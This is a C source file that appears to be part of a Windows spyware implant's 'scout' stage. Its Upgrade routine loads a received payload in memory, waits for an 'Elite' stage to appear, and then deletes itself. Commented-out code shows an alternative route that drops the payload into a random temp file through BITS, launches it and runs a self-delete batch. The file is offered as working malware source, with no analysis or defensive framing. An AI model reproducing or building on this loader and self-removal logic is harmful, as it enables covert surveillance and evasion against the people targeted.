#include <Windows.h>
#include <stdio.h>

#include "main.h"
#include "upgrade.h"
#include "bits.h"
#include "ldr.h"

extern BOOL uMelted;
extern PULONG uSynchro;
extern PWCHAR GetRandomString(ULONG uMin);
extern HANDLE hScoutSharedMemory;


BOOL Upgrade(PWCHAR pUpgradePath, PBYTE pFileBuffer, ULONG uFileLength)
{
#ifdef _DEBUG
	PWCHAR pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
	swprintf_s(pDebugString, 1024, L"[+] Dumping %d bytes of upgrade to %s\n", uFileLength, pUpgradePath);
	OutputDebugString(pDebugString);
	free(pDebugString);
#endif

	OutputDebugString(L"Starting upgrade!");

	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MemoryLoader, pFileBuffer, 0, NULL);
	WaitForSingleObject(hThread, 60000);

	ULONG uRetries = 0;
	BOOL bSuccess = FALSE;
	while (uRetries < 10)
	{
		if (ExistsEliteSharedMemory())
		{
			bSuccess = TRUE;
			break;
		}
		Sleep(6000);
		uRetries++;
	}

	if (bSuccess)
	{
		if (!uMelted)
			DeleteAndDie(TRUE);

		if (*uSynchro)
			DeleteAndDie(TRUE);
		else
		{
			DeleteAndDie(FALSE);
			*uSynchro = 1;
			while(1)
				WaitForSingleObject(GetCurrentThread(), INFINITE);
		}
	}
#ifdef _DEBUG
	else
		OutputDebugString(L"Memory Loader FAIL\n");
#endif

	return bSuccess;
	/*																				rr
	if(MemoryLoader(pFileBuffer))
	{
		MessageBox(NULL, L"QUI NON TORNA", L"QUI NON", 0);
		if (uMelted)
		{
			*uSynchro = 1;
			ExitThread(0);
		}
		else
			ExitProcess(0);
	}
#ifdef _DEBUG
	else
		OutputDebugString(L"Memory Loader FAIL\n");
#endif
	*/


	/*
	HANDLE hFile = CreateFile(pUpgradePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile)
	{
		ULONG uOut;

		WriteFile(hFile, pFileBuffer, uFileLength, &uOut, NULL);
		CloseHandle(hFile);

		if (GetCurrentProcessId() == 4)
			MessageBox(NULL, L"I'm going to start it", L"WARNING", 0);


		PWCHAR pDest, pTempPath, pRandName;
		pTempPath = GetTemp();

		pDest = (PWCHAR)malloc(4096);
		pRandName = GetRandomString(8);
		_snwprintf_s(pDest, 4096/sizeof(WCHAR), _TRUNCATE, L"%s\\%s.tmp", pTempPath, pRandName); // .exe FIXME
		free(pRandName);

#ifdef _DEBUG
		OutputDebugString(L"[+] Starting BITS..\n");
#endif
		BitTransfer(pUpgradePath, pDest);
		DeleteFile(pUpgradePath);
		free(pTempPath);

		OutputDebugString(L"Starting upgrade!");
		
		PWCHAR pBatchName;
		CreateDeleteBatch(pDest, &pBatchName);

		STARTUPINFO si;
		PROCESS_INFORMATION pi;		
		SecureZeroMemory(&si, sizeof(STARTUPINFO));
		SecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
		si.cb = sizeof(si);

		gogogo(pFileBuffer);
		free(pFileBuffer);
		ExitProcess(0); /// TEST TEST TEST DELETEME
		
		if (CreateProcess(pDest, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
		{
			StartBatch(pBatchName);	
			if (uMelted)
			{
				*uSynchro = 1;
				ExitThread(0);
			}
			else
				ExitProcess(0);
		}
		else
		{
#ifdef _DEBUG
			OutputDebugString(L"[!!] Error executing upgrade\n");
#endif
			DeleteFile(pDest);
			free(pDest);
			free(pBatchName); // FIXME
			return FALSE;
		}
	}
	else
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] Cannot create upgrade file!!\n");		
#endif
		return FALSE;
	}
	

	return FALSE;
	*/
}